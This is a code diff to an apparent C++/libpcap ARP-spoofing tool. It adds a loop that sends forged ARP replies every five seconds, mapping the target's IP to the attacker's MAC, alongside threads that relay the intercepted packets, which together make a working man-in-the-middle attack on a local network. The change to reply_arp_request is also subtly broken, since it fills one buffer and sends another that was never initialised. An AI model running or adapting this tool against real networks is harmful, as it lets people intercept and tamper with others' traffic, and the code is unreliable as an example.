@@ -34,6 +34,7 @@ public:
     void init_ip(char* _sender_ip, char* _target_ip, char* _attacker_ip);
     void init_mac(char* _attacker_mac);
     void arp_storm();
+    void change_handle(pcap_t * _handle);
     void relay_packet();
     void reply_arp_request();
     void keep_arp_request();
@@ -93,6 +94,11 @@ void Session::arp_storm()
     }
 }
 
+void Session::change_handle(pcap_t * _handle)
+{
+    handle = _handle;
+}
+
 void Session::relay_packet()
 {
     printf("Performing Packet Relay...\n");
@@ -144,26 +150,26 @@ void Session::reply_arp_request()
             struct ether_arp* arp_hdr;
             arp_hdr = (struct ether_arp*)(packet + 14);
             if (ntohs(arp_hdr->arp_op) == 0x0001) {
-                u_char packet[100];
-                struct ethhdr* eth_hdr;
-                struct ether_arp* arp_hdr;
+                u_char _packet[100];
+                struct ethhdr* _eth_hdr;
+                struct ether_arp* _arp_hdr;
 
-                eth_hdr = (struct ethhdr*)packet;
-                memcpy(eth_hdr->h_dest, sender_mac, 6);
-                memcpy(eth_hdr->h_source, attacker_mac, 6);
-                eth_hdr->h_proto = htons(ETHERTYPE_ARP);
+                _eth_hdr = (struct ethhdr*)packet;
+                memcpy(_eth_hdr->h_dest, sender_mac, 6);
+                memcpy(_eth_hdr->h_source, attacker_mac, 6);
+                _eth_hdr->h_proto = htons(ETHERTYPE_ARP);
 
-                arp_hdr = (struct ether_arp*)(packet + 14);
-                arp_hdr->arp_hrd = htons(ARPHRD_ETHER);
-                arp_hdr->arp_pro = htons(ETHERTYPE_IP);
-                arp_hdr->arp_hln = 0x06;
-                arp_hdr->arp_pln = 0x04;
-                arp_hdr->arp_op = htons(0x0002);
-                memcpy(arp_hdr->arp_sha, attacker_mac, 6);
-                memcpy(arp_hdr->arp_tha, sender_mac, 6);
-                memcpy(arp_hdr->arp_spa, target_ip, 4);
-                memcpy(arp_hdr->arp_tpa, sender_ip, 4);
-                if (pcap_sendpacket(handle, packet, sizeof(struct ethhdr) + sizeof(struct ether_arp)) != 0) {
+                _arp_hdr = (struct ether_arp*)(packet + 14);
+                _arp_hdr->arp_hrd = htons(ARPHRD_ETHER);
+                _arp_hdr->arp_pro = htons(ETHERTYPE_IP);
+                _arp_hdr->arp_hln = 0x06;
+                _arp_hdr->arp_pln = 0x04;
+                _arp_hdr->arp_op = htons(0x0002);
+                memcpy(_arp_hdr->arp_sha, attacker_mac, 6);
+                memcpy(_arp_hdr->arp_tha, sender_mac, 6);
+                memcpy(_arp_hdr->arp_spa, target_ip, 4);
+                memcpy(_arp_hdr->arp_tpa, sender_ip, 4);
+                if (pcap_sendpacket(handle, _packet, sizeof(struct ethhdr) + sizeof(struct ether_arp)) != 0) {
                     printf("Error in Replying ARP!\n");
                     return;
                 }
@@ -174,12 +180,47 @@ void Session::reply_arp_request()
 
 void Session::keep_arp_request()
 {
-    return;
+    u_char packet[100];
+    struct ethhdr* eth_hdr;
+    struct ether_arp* arp_hdr;
+
+    eth_hdr = (struct ethhdr*)packet;
+    memcpy(eth_hdr->h_dest, sender_mac, 6);
+    memcpy(eth_hdr->h_source, attacker_mac, 6);
+    eth_hdr->h_proto = htons(ETHERTYPE_ARP);
+
+    arp_hdr = (struct ether_arp*)(packet + 14);
+    arp_hdr->arp_hrd = htons(ARPHRD_ETHER);
+    arp_hdr->arp_pro = htons(ETHERTYPE_IP);
+    arp_hdr->arp_hln = 0x06;
+    arp_hdr->arp_pln = 0x04;
+    arp_hdr->arp_op = htons(0x0002);
+    memcpy(arp_hdr->arp_sha, attacker_mac, 6);
+    memcpy(arp_hdr->arp_tha, sender_mac, 6);
+    memcpy(arp_hdr->arp_spa, target_ip, 4);
+    memcpy(arp_hdr->arp_tpa, sender_ip, 4);
+    while (1) {
+        arp_hdr->arp_op = htons(0x0002);
+        memcpy(eth_hdr->h_dest, sender_mac, 6);
+        memcpy(arp_hdr->arp_tha, sender_mac, 6);
+        if (pcap_sendpacket(handle, packet, sizeof(struct ethhdr) + sizeof(struct ether_arp)) != 0) {
+            printf("Error in Keeping ARP!\n");
+            return;
+        }
+        arp_hdr->arp_op = htons(0x0001);
+        memset(eth_hdr->h_dest, 0xFF, 6);
+        memset(arp_hdr->arp_tha, 0x00, 6);
+        if (pcap_sendpacket(handle, packet, sizeof(struct ethhdr) + sizeof(struct ether_arp)) != 0) {
+            printf("Error in Keeping ARP!\n");
+            return;
+        }
+        sleep(5);
+    }
 }
 
 int main(int argc, char* argv[])
 {
-    pcap_t* handle;
+    pcap_t *handle;
     char dev[16];
     char errbuf[PCAP_ERRBUF_SIZE];
     struct bpf_program fp;
@@ -234,7 +275,7 @@ int main(int argc, char* argv[])
         session.push_back(ts);
     }
 
-    for(sessioni = session.begin(); sessioni != session.end(); ++sessioni) {
+    for (sessioni = session.begin(); sessioni != session.end(); ++sessioni) {
 
         lot.push_back(thread(&Session::arp_storm, *sessioni));
         // thread t(&Session::arp_storm, *sessioni);
@@ -242,12 +283,20 @@ int main(int argc, char* argv[])
         // lot.push_back(t);
     }
 
-    for(loti = lot.begin(); loti != lot.end(); ++loti)
+    for (loti = lot.begin(); loti != lot.end(); ++loti)
         (*loti).join();
 
+    pcap_close(handle);
     lot.clear();
 
-    for(sessioni = session.begin(); sessioni != session.end(); ++sessioni) {
+    handle = pcap_open_live(dev, BUFSIZ, 0, 1000, errbuf);
+    if (handle == NULL) {
+        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
+        return (2);
+    }
+
+    for (sessioni = session.begin(); sessioni != session.end(); ++sessioni) {
+        (*sessioni).change_handle(handle);
         lot.push_back(thread(&Session::relay_packet, *sessioni));
         lot.push_back(thread(&Session::reply_arp_request, *sessioni));
         lot.push_back(thread(&Session::keep_arp_request, *sessioni));
@@ -260,8 +309,10 @@ int main(int argc, char* argv[])
         // lot.push_back(t3);
     }
 
-    for(loti = lot.begin(); loti != lot.end(); ++loti)
+    for (loti = lot.begin(); loti != lot.end(); ++loti)
         (*loti).join();
+
+    pcap_close(handle);
 }
 
 void get_attacker_info(char* dev, char* mac, char* ip)
